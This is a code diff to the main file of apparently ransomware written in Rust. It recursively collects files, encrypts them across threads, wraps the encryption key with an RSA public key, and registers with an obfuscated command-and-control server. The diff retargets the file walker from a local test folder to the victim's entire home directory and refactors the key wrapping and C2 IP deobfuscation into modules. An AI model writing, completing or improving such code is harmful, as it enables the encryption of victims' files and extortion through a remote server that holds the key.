@@ -1,10 +1,9 @@
 use comms::{generate_ucid, Message};
+use encryptor::wrap_key;
 use filesystem::recurse_directory_with_channel;
-use openssl::rsa;
-use openssl::rsa::Padding;
+use obfuscation::get_ip;
 use std::env;
 use std::io;
-use std::path::PathBuf;
 use std::process::exit;
 use std::thread::sleep;
 use std::time::Duration;
@@ -18,6 +17,7 @@ use zeroize::Zeroize;
 mod comms;
 mod encryptor;
 mod filesystem;
+mod obfuscation;
 
 const THREADS: i32 = 8;
 
@@ -95,8 +95,7 @@ async fn main() {
     let (s, r) = crossbeam_channel::unbounded();
 
     event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
-    //recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
-    recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
+    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);
 
     if !disable_cryptography {
         let mut threads = Vec::new();
@@ -118,31 +117,17 @@ async fn main() {
     }
 
     event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
-    let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
-    let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();
-    let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
-    let buffer_len = encryptor.encrypt_len(&key).unwrap();
-    let mut encrypted = vec![0u8; buffer_len];
-
-    // Encrypt the data and discard its length
-    let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
-
-    let mut output_buff = vec![0u8; SERVER_IP.len()];
-
-    let len = p_key
-        .rsa()
-        .unwrap()
-        .public_decrypt(SERVER_IP, &mut output_buff, Padding::PKCS1)
-        .unwrap();
-    let ip =
-        String::from_utf8(output_buff[0..len].to_vec()).expect("C2 Endpoint Deobfuscation Error");
+    let encrypted_key = wrap_key(&key);
 
     let mut ucid = generate_ucid().unwrap();
+
+    let ip = get_ip();
 
     key.zeroize(); // zero out key, not needed anymore
 
     event!(Level::INFO, "-- REACHED STAGE: Networking --");
-    let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
+    let mut register_blob =
+        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
 
     let addr = ip.parse().unwrap();
 
@@ -206,7 +191,7 @@ async fn main() {
                     );
                     ucid = generate_ucid().unwrap();
                     register_blob =
-                        comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
+                        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
                 }
                 Message::RateReject() => {
                     event!(
